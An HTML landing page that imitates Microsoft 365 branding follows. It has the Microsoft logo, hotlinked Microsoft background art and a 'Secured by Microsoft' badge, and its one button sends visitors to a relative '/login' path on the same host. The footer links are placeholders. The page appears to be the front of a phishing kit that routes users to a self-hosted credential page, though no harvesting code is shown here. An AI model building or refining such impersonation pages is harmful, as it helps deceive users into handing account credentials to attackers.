<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Microsoft 365</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', SegoeUI, 'Helvetica Neue', Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            background: #f2f2f2;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
            position: relative;
            overflow: hidden;
        }
        .bg-layer {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        .bg-layer .bg-img {
            width: 100%; height: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg');
        }
        .card {
            width: 440px;
            max-width: 100%;
            background: #ffffff;
            box-shadow: 0 2px 24px rgba(0, 0, 0, 0.15);
            padding: 44px;
            border-radius: 0;
            position: relative;
            z-index: 1;
            opacity: 0;
            transform: translateX(60px);
            animation: slideIn 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
        }
        @keyframes slideIn {
            0% { opacity: 0; transform: translateX(60px) scale(0.97); }
            100% { opacity: 1; transform: translateX(0) scale(1); }
        }
        .ms-logo {
            display: block;
            width: 108px;
            height: 24px;
            user-select: none;
            opacity: 0;
            animation: fadeIn 0.6s ease 0.15s forwards;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: scale(0.95); }
            100% { opacity: 1; transform: scale(1); }
        }
        .content {
            opacity: 0;
            transform: translateX(30px);
            animation: contentSlide 0.5s ease 0.2s forwards;
        }
        @keyframes contentSlide {
            0% { opacity: 0; transform: translateX(30px); }
            100% { opacity: 1; transform: translateX(0); }
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            line-height: 28px;
            color: #1b1b1b;
            margin: 16px 0 0 0;
            text-align: left;
            letter-spacing: -0.01em;
        }
        .info-text {
            margin-top: 16px;
            font-size: 15px;
            line-height: 20px;
            color: #1b1b1b;
            text-align: left;
        }
        .info-text p { margin: 0; font-weight: 400; }
        .info-text p.strong { margin-top: 16px; font-weight: 600; }
        .btn-container {
            margin-top: 28px;
            opacity: 0;
            transform: translateX(25px);
            animation: contentSlide 0.5s ease 0.35s forwards;
        }
        .btn {
            display: inline-block;
            width: 100%;
            padding: 12px 20px;
            background: #0078d4;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: background 0.2s ease;
            line-height: 1.2;
        }
        .btn:hover { background: #005da6; }
        .btn:active { background: #004a8c; transform: scale(0.98); }
        .btn .arrow {
            display: inline-block;
            margin-left: 8px;
            transition: transform 0.2s ease;
        }
        .btn:hover .arrow { transform: translateX(4px); }
        .footer {
            margin-top: 28px;
            padding-top: 16px;
            border-top: 1px solid #e6e6e6;
            font-size: 12px;
            color: #999;
            text-align: center;
            opacity: 0;
            animation: fadeIn 0.6s ease 0.5s forwards;
        }
        .footer .security-badge {
            display: inline-block;
            background: #e8f0fe;
            color: #0067b8;
            padding: 4px 14px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .footer .links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 6px;
            flex-wrap: wrap;
        }
        .footer .links a { color: #666; text-decoration: none; transition: color 0.2s ease; }
        .footer .links a:hover { color: #0078d4; text-decoration: underline; }
        .footer .links span { color: #ccc; }
        @media (max-width: 600px) {
            .card { width: 100% !important; max-width: 440px; padding: 32px 24px; }
            h1 { font-size: 20px; }
            .info-text { font-size: 14px; }
        }
        @media (max-width: 360px) {
            .card { padding: 24px 16px; }
            .footer .links { flex-direction: column; gap: 4px; }
        }
    </style>
</head>
<body>

    <div class="bg-layer"><div class="bg-img"></div></div>

    <div class="card" role="main">
        <div class="ms-logo">
            <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                <g>
                    <rect x="0" y="1" width="10.5" height="10.5" fill="#F25022"/>
                    <rect x="11.5" y="1" width="10.5" height="10.5" fill="#7FBA00"/>
                    <rect x="0" y="12.5" width="10.5" height="10.5" fill="#00A4EF"/>
                    <rect x="11.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/>
                </g>
                <text x="27" y="18.2" font-family='"Segoe UI", SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif' font-size="15.5" font-weight="600" fill="#5E5E5E" letter-spacing="-0.01em">Microsoft</text>
            </svg>
        </div>

        <div class="content">
            <h1>Microsoft 365</h1>
            <div class="info-text">
                <p>Secure access to your account</p>
                <p class="strong">Do not share your credentials with untrusted sources.</p>
            </div>
        </div>

        <!-- ✅ FIXED: Button now goes to /login -->
        <div class="btn-container">
            <a href="/login" class="btn">
    Continue to Microsoft 365
    <span class="arrow">→</span>
</a>
        </div>

        <div class="footer">
            <div class="security-badge">Secured by Microsoft</div>
            <div class="links">
                <a href="#">Privacy &amp; Cookies</a>
                <span>|</span>
                <a href="#">Terms of use</a>
                <span>|</span>
                <span style="color:#999;">© 2024 Microsoft</span>
            </div>
        </div>
    </div>

</body>
</html>
